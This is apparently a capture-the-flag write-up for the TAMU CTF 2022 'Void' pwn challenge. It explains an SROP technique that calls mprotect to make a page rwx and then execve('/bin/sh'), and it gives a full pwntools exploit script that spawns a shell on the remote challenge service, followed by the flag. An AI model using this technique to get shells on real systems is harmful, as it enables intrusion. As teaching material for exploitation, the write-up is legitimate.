---
title: "[Pwn] Void [Tamu CTF 2022]"
date: 2022-04-17 17:25:00
---

# 0x0 Introduction

Author: sky

Can't exploit it if there isn't anything to exploit, right? NX, no libc, what else even can you do?!

SNI: void

files: [void](void), [void.c](void.c)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

This is a **SROP** challenge. 

In order to call `syscall(59,'/bin/sh',0,0)`, we need find a writable memory page to write our string at. But the binary itself does not have a writable region except stack.
```
0x0000000000400000 - 0x0000000000401000 - usr     4K s r-- segment.ehdr
0x0000000000401000 - 0x0000000000402000 * usr     4K s r-x map.void.r_x
0x0000000000402000 - 0x0000000000403000 - usr     4K s r-- map.void.r__
0x00007ffc84ce8000 - 0x00007ffc84d09000 - usr   132K s rw- [stack] [stack] ; map._stack_.rw_
0x00007ffc84d13000 - 0x00007ffc84d17000 - usr    16K s r-- [vvar] [vvar] ; map._vvar_.r__
0x00007ffc84d17000 - 0x00007ffc84d18000 - usr     4K s r-x [vdso] [vdso] ; map._vdso_.r_x
```

However, their is no way we can output the stack address using `write`, since `rdi` never set to 1 (`stdout`).

Therefore, we need to use `mprotect` to create an `rwx` memory page so that we can write stack or put shellcode on.

To do that, we also need to set `rsp` to a address on the memory space which point back to the instructions. So when `ret` is called, it will go back to the executable instruction.

luckily, in `0x004020b8`, there is address that point back to `main`. So we can happily point rsp to there and make whole `0x00402000-0x00403000` page writable. 

```
0x004020b8 0x0000000000401000   ..@..... 4198400 /home/aynakeya/ctf/tamuctf2022/void/void .text main,section..text,segment.LOAD1,.text,main,map._home_aynakeya_ctf_tamuctf2022_void_void.r_x main program R X 'mov rax, 0' 'void'
0x004020c0 ..[ null bytes ]..   00000000
0x004020c8 0x0003000300000000   ........
```

After that, we can continue do another sigreturn there and execute `execve("/bin/sh")` to get shell.

# 0x3 Exploit

```
from pwn import *


class BinaryInfo:
    exe = "void"
    libc = ""

    host = "rua.host.goes.here"
    port = 8000


# Set up pwntools for the correct architecture
exe = context.binary = ELF(BinaryInfo.exe)
exe_rop = ROP(exe)
if BinaryInfo.libc != "":
    libc = ELF(BinaryInfo.libc)
    libc_rop = ROP(libc)
else:
    libc = None
    libc_rop = None


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or BinaryInfo.host
port = int(args.PORT or BinaryInfo.port)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = remote("tamuctf.com", 443, ssl=True, sni="void")
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
#    Arch:     amd64-64-little
#    RELRO:    No RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x400000)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


def log_print(*msg):
    log.info(" ".join(map(str,msg)))


def int2byte(x: int):
    return x.to_bytes(exe.bytes, "little")


def wait_for_debugger(io):
    if args.LOCAL and input("debugger?") == "y\n":
        pid = util.proc.pidof(io)[0]
        log_print("The pid is: " + str(pid))
        util.proc.wait_for_debugger(pid)
        log_print("press enter to continue")

ret_addr = exe_rop.find_gadget(['ret'])[0]


io = start()
wait_for_debugger(io)

# rax syscall x64
# 0   read
# 1   write
# 15  rt_sigreturn
# 59  execve

main_addr = exe.sym["main"]
syscall_ret_addr = 0x00401018
fake_rwx_stack_addr = 0x004020b8


mprotect_frame = SigreturnFrame()
mprotect_frame.rip = syscall_ret_addr # return to main and do other thing
mprotect_frame.rsp = fake_rwx_stack_addr
mprotect_frame.rax = constants.SYS_mprotect
mprotect_frame.rdi = 0x00402000
mprotect_frame.rsi = 0x1000
mprotect_frame.rdx = 7 # rwx

do_mprotect = flat({
    0:[
        main_addr,
        syscall_ret_addr,
        bytes(mprotect_frame)
    ]
})

input("send mprotect payload")
io.send(do_mprotect) # set up sigreturn frame
input("trigger sigreturn and mprotect")
io.send(do_mprotect[8:8+15]) # read 15 bytes, trigger sigreturn


execve_bin_sh_frame = SigreturnFrame()
execve_bin_sh_frame.rip = syscall_ret_addr # return to main and do other thing
execve_bin_sh_frame.rsp = fake_rwx_stack_addr # 
execve_bin_sh_frame.rax = constants.SYS_execve
execve_bin_sh_frame.rdi = fake_rwx_stack_addr +8+ len(flat({0:[main_addr,syscall_ret_addr,bytes(execve_bin_sh_frame)]}))
execve_bin_sh_frame.rsi = 0
execve_bin_sh_frame.rdx = 0

do_execve_bin_sh = flat({
    0:[
        main_addr,
        syscall_ret_addr,
        bytes(execve_bin_sh_frame),
        b"/bin/sh\x00",
    ]
})


input("send execve bin/sh payload")
io.send(do_execve_bin_sh) # set up sigreturn frame
input("trigger sigreturn and mprotect")
io.send(do_execve_bin_sh[8:8+15]) # read 15 bytes, trigger sigreturn

io.interactive()
```

# 0x4 Flag

gigem{1_6u355_7h475_h0w_w3_3xpl017_17}